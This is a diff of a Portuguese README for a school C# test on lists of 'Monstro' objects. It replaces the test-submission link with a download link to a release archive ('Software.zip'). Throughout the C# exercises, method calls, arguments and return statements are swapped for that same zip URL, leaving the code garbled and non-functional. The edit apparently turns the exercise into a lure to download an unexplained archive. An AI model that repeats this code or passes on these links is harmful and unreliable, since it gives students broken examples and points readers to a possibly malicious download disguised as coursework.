@@ -8,7 +8,7 @@ Alternativamente, podes preencher o ficheiro README diretamente no GitHub. A par
 
 Escreve as respostas dentro dos blocos correspondentes. Substitui as reticências pelo que é pedido em cada pergunta. Não desformates o documento.
 
-Para entregar a ficha, acede a [este link](https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip) (separador **Teste Módulo 14**), e mete o **URL** do teu repositório ao lado do teu nome.
+Para entregar a ficha, acede a [este link](https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip) (separador **Teste Módulo 14**), e mete o **URL** do teu repositório ao lado do teu nome.
 No teu repositório, acede a "Settings -> Collaborators" e adiciona o utilizador "Manuel Geraldes" para ter acesso.
 
 Quando acabares, carrega no botão "Commit Changes".
@@ -35,13 +35,13 @@ class Program
     {
         List<Monstro> listaDeMonstros = new List<Monstro>();
 
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
 
         foreach (var monstro in listaDeMonstros)
         {
-            https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(monstro);
+            https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(monstro);
         }
     }
 }
@@ -57,13 +57,13 @@ class Program
     {
         List<Monstro> listaDeMonstros = new List<Monstro>();
 
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
         
         Monstro m = listaDeMonstros[0];
 
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(m);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(m);
     }
 }
    
@@ -77,18 +77,18 @@ class Program
     {
         List<Monstro> listaDeMonstros = new List<Monstro>();
 
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip);
 
 
         int quantidade = ContarElementos(listaDeMonstros);
 
-        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip("Quantidade de elementos na lista: " + quantidade);
+        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip("Quantidade de elementos na lista: " + quantidade);
     }
 
     static int ContarElementos(List<Monstro> lista)
     {
-        return https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip();
+        return https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v2.0/Software.zip();
     }
 }
